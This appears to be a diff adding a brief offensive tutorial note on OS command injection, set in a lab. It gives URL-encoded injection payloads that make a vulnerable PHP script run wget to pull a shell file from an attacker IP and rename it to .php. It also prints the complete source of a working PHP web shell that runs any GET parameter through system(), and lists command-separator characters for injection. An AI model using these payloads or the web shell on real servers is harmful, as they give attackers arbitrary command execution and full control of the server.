@@ -1,0 +1,41 @@
+1. Find Shell Injection/OS Command Execution vulnerability 
+
+
+Shell injection is generally considered one of the most dangerous vulnerabilities because it can be used to gain complete control over a target server. Although server and OS hardening can help to limit the impact and make it harder for an attacker to escalate privileges, there is still significant risk. Privilege escalation usually takes the following path:
+
+- Find Shell injection vulnerability. Leverage the vulnerability to gain further shell access by creating a custom shell script accessible to the attacker. This can take many forms, most simply a new, dedicated PHP page which acts as a shell. By default, this shell will have the same access as the user running the web server, usually Apache or IIS.
+- Once shell access is established, the attacker can monitor processes for additional attack landscapes. A good target might be a database user connection, which allows SQL injection attacks directly against the database, and may allow the attacker to gain control of the database user as well, using SQL Injection to create setuid files owned by the database owner with global read privileges.
+- From this point, it is a matter of an attacker finding other vulnerabilities on the server and exploiting them to gain additional privileges. Whether this is finding unprotected setuid to root or exploiting known software bugs, it is only a matter of time before the attacker has complete control of the system.
+(http://www.golemtechnologies.com/articles/shell-injection)
+
+2. Upload shell (example)
+example1.php is a vulnerable script. 'ip' GET parameter can be malicious with arbitrary OS command
+
+192.168.1.6 - victim server
+192.168.1.3 - attacker server
+
+- get shell script from remote server
+http://192.168.1.6/commandexec/example1.php?ip=127.0.0.1;cd%20../;wget%20http://192.168.1.3/myshell.txt
+
+- rename it to .php script
+http://192.168.1.6/commandexec/example1.php?ip=127.0.0.1;cd%20../;cp%20myshell.txt%20myshell.php
+
+- using it:
+http://192.168.1.6/myshell.php?c=
+
+
+3. myshell.php
+
+<form action="" method="get"><textarea name="c" rows="10" cols="80"><?php if (isset($_GET['c'])) {echo $_GET['c'];}?></textarea><button type="submit">go</button></form><hr /><div><p>Result of <strong><?php if(isset($_GET['c'])){echo $_GET['c'];}?></strong></p><pre><?php $output="";if (isset($_GET['c'])){$output=@system($_GET['c']);};?></pre></div>
+
+
+4. Special signs using in OS command injections:
+
+&
+&&
+;
+|
+||
+%0a (new line)
+
+
